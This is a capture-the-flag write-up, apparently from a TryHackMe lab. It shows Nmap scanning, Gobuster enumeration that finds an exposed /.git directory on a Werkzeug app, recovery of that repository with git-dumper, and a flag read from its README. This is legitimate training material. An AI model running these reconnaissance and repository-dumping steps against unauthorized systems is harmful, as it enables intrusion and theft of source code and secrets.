## 1. Port Scanning

We begin by identifying open ports and the versions of the running services using Nmap:

```bash
sudo nmap -sS -sV 10.112.132.236
```

Output:

```text
[sudo] password for deb88:
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-03 05:13 EDT
Nmap scan report for 10.112.132.236
Host is up (0.061s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two open ports are discovered:

* `22/tcp` — SSH, OpenSSH 9.6p1 Ubuntu;
* `8080/tcp` — HTTP, Werkzeug 3.0.1 running on Python 3.12.3.

We focus on the web application running on port `8080`.

## 2. Directory Enumeration

To search for hidden directories and files, we use Gobuster:

```bash
gobuster dir -u http://10.112.132.236:8080 -w ~/HH101/seclists/Discovery/Web-Content/big.txt
```

Output:

```text
===============================================================

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

[+] Url:                     http://10.112.132.236:8080
```

As a result, we discover an accessible `/.git` directory:

```text
/.git (Status: 200) [Size: 437]
```

This indicates that Git repository metadata is accessible through the web server. If the repository is accessible, we can try to recover it.

## 3. Downloading the Git Repository

To extract the repository contents, we use `git-dumper`:

```bash
git-dumper http://10.112.132.236:8080/.git dumped_repo
```

After running the command, the repository is saved to the `dumped_repo` directory.

## 4. Analyzing the README

In the recovered repository, we find a `README` file.

It contains the project name:

```text
# Byte Lotus — Guest Experience Platform
```

The README also states that this is an internal staging repository:

```text
Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.
```

Therefore, we have gained access to the application's internal staging repository.

## 5. Obtaining the Flag

At the end of the README, we find the flag:

```text
Staging flag: THM{byt3_l0tus_n3v3r_f0rg3ts}
```

Thus, the flag was obtained by discovering the `/.git` directory exposed through the web server, which allowed us to recover the contents of the internal Git repository.
